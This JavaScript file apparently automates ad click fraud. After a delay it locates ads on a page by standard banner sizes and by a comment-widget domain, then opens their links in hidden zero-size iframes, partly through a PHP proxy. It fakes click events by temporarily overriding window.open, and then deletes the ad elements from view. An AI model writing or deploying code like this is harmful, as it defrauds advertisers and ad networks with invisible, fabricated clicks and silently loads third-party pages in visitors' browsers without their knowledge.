var init = function () {
    if (!$) {
        window.$ = window.jQuery;
    }
};

init();

var triggerEvent = function (dom, type) {
    // 创建
    var evt = document.createEvent('HTMLEvents');

    // 初始化
    evt.initEvent(type, true, true);

    // 触发
    dom.dispatchEvent(evt);
};

var isNotUrl = function (str) {
    if (!str || str.indexOf('javascript:') === 0) {
        return true;
    }
    return false;
};

var findAdsWithSize = function (width, height, iframe) {
    var $dom = $('html');
    if (iframe) {
        $dom = $(iframe).contents();
    }
    return $dom.find('img,iframe,embed,object').filter(function (index, item) {
        return $(item).width() == width && $(item).height() == height;
    });
};

var findAdsWithDomain = function (domain, iframe) {
    var $dom = $('html');
    if (iframe) {
        $dom = $(iframe).contents();
    }
    return $dom.find('iframe').filter(function (index, item) {
        var src = $(item).attr('src');
        return src && src.indexOf(domain) > -1 && src.indexOf(domain) < 9;
    });
};

var lastIframe = null;

var openAds = function (href) {
    if (lastIframe) {
        $(lastIframe).remove();
    }
    var $iframe = $('<iframe height=0 width=0 />');
    $('body').append($iframe);
    $iframe.on('load', function (e) {
        $(this).remove();
    });
    $iframe.get(0).src = href;
};

var openIframeAds = function (src) {
    if (lastIframe) {
        $(lastIframe).remove();
    }
    var $iframe = $('<iframe height=0 width=0 />');
    $('body').append($iframe);
    var args = arguments;
    lastIframe = $iframe.get(0);
    $iframe.on('load', function (e) {
        var params = [];
        for (var i = 1; i < args.length; i ++) {
            params.push(args[i]);
        }
        autoOpenAds.apply(null, params.concat(this));
    });
    $iframe.get(0).src = '/PHPProxy/phpproxy.php?url=' + src;
};

var autoOpenAds = function (width, height, iframe) {
    var $ads = findAdsWithSize(width, height, iframe);

    if ($ads.length < 1) {
        return false;
    }

    if ($ads.get(0).tagName === 'IFRAME') {
        var src = $ads.attr('src');
        if (!src || (src.indexOf(location.host) > -1 && src.indexOf(location.host) < 9)) {
            autoOpenAds(width, height, $ads.get(0));
        } else {
            openIframeAds(src, width, height);
            // if ($ads.parent().get(0).tagName === 'BODY') {
            //     $ads.remove();
            // } else {
            //     $ads.parent().remove();
            // }
        }
    } else {
        var $a = $ads.siblings('a');

        if ($a.length === 0) {
            $a = $ads.parents('a');
        }

        if ($a.length === 0) {
            $a = $ads.prev();
        }

        if (isNotUrl($a.attr('href'))) {
            var wOpen = window.open;
            window.open = openAds;
            triggerEvent($a.get(0), 'click');
            window.open = wOpen;
        } else {
            openAds($a.attr('href'));
        }

        if ($a.parent().get(0).tagName === 'BODY') {
            $a.remove();
        } else {
            $a.parent().remove();
        }
    }

    return true;
};

var autoOpenDomainAds = function (domain, width, height, iframe) {
    var $ads = findAdsWithDomain(domain, iframe);

    if ($ads.length < 1) {
        return false;
    }

    $ads.each(function (index, item) {
        var $item = $(item);
        var src = $(item).attr('src');
        openIframeAds(src, width, height);
        // if ($item.parent().get(0).tagName === 'BODY') {
        //     $item.remove();
        // } else {
        //     $item.parent().remove();
        // }
    });

    return true;
};

setTimeout(function () {
    autoOpenAds(300, 250);
    autoOpenAds(728, 90);
    autoOpenDomainAds('changyan.sohu.com', 728, 90);
    setTimeout(function () {
        if (lastIframe) {
            // $(lastIframe).remove();
        }
    }, 10000);
}, 10000);
